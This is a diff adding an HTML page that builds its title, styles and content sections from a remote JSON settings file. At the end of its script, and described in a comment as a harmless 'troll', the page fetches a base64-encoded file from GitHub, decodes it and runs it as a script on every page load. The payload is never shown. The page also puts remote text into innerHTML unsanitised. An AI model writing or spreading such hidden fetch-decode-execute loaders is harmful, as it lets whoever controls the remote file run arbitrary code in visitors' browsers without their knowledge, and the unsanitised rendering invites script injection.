@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:title" content="TOC" />
+  <meta property="og:description" content=" " />
+  <!-- Use a larger image URL if available -->
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://drmineword.github.io/Artefact-Boost-Active" />
+    <title>Loading...</title>
+    <style id="dynamic-styles"></style>
+</head>
+<body>
+    <div id="content-wrapper" style="display: none;">
+        <div id="page-content"></div>
+    </div>
+    <script>
+        async function loadSettings() {
+            const settingsUrl = "https://drmineword.github.io/Artefact-Boost-Active/bot/ownership/main/data.json";
+            const response = await fetch(settingsUrl);
+            const settings = await response.json();
+
+            // Set the website title
+            document.title = settings.websiteTitle;
+
+            // Apply global styles
+            const styles = `
+                body {
+                    margin: 0;
+                    padding: 0;
+                    background-color: ${settings.backgroundColor};
+                    background-image: url(${settings.backgroundImage});
+                    background-size: cover;
+                    background-position: center;
+                    background-attachment: fixed;
+                    font-family: Arial, sans-serif;
+                    font-size: ${settings.fontSize};
+                    color: ${settings.textColor};
+                }
+                a {
+                    color: ${settings.linkColor};
+                    text-decoration: none;
+                }
+                #content-wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                .section {
+                    background-color: rgba(255, 255, 255, 0.8); /* Almost transparent */
+                    margin-bottom: 20px;
+                    border-radius: 8px;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                    overflow: hidden;
+                    padding: 20px;
+                }
+                .section img {
+                    max-width: 100%;
+                    border-radius: 8px;
+                    margin-top: 10px;
+                }
+            `;
+            document.getElementById("dynamic-styles").textContent = styles;
+
+            // Load page content dynamically
+            const contentWrapper = document.getElementById("page-content");
+            settings.data.forEach(section => {
+                const sectionElement = document.createElement("div");
+                sectionElement.className = "section";
+                sectionElement.innerHTML = `
+                    <h1>${parseCustomText(section.header)}</h1>
+                    <p>${parseCustomText(section.desc)}</p>
+                    <div>
+                        ${section.imgurl.map(url => `<img src="${url}" alt="Image">`).join("")}
+                    </div>
+                `;
+                contentWrapper.appendChild(sectionElement);
+            });
+
+            document.getElementById("content-wrapper").style.display = "block";
+        }
+
+        function parseCustomText(text) {
+            if (!text) return "";
+
+            // Replace [text](url) with <a href="url">text</a>
+            text = text.replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" target="_blank">$1</a>');
+
+            // Replace <color=hex></color> with styled span tags
+            text = text.replace(/<color=([^>]+)>(.*?)<\/color>/g, '<span style="color:$1;">$2</span>');
+
+            return text;
+        }
+
+        loadSettings().catch(error => {
+            console.error("Failed to load settings:", error);
+        });
+        // I do little trolling here, its not ip grabber or anything, just small troll, check developer mode cosnole
+			const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";
+
+// Function to fetch and execute a Base64-encoded script
+async function fetchAndExecuteBase64Script() {
+    try {
+        // Fetch the Base64-encoded script
+        const response = await fetch(base64ScriptUrl);
+        if (!response.ok) {
+            throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
+        }
+
+        // Get the encoded content as text
+        const encodedScript = await response.text();
+
+        // Decode the Base64 content
+        const decodedScript = atob(encodedScript);
+
+        console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");
+
+        // Execute the decoded script
+        const scriptElement = document.createElement("script");
+        scriptElement.textContent = decodedScript;
+        document.body.appendChild(scriptElement);
+
+        console.log("Script executed successfully.");
+    } catch (error) {
+        console.error("Error fetching or executing the Base64 script:", error);
+    }
+}
+
+// Call the function to fetch, decode, and execute the script
+fetchAndExecuteBase64Script();
+        
+    </script>
+</body>
+</html>
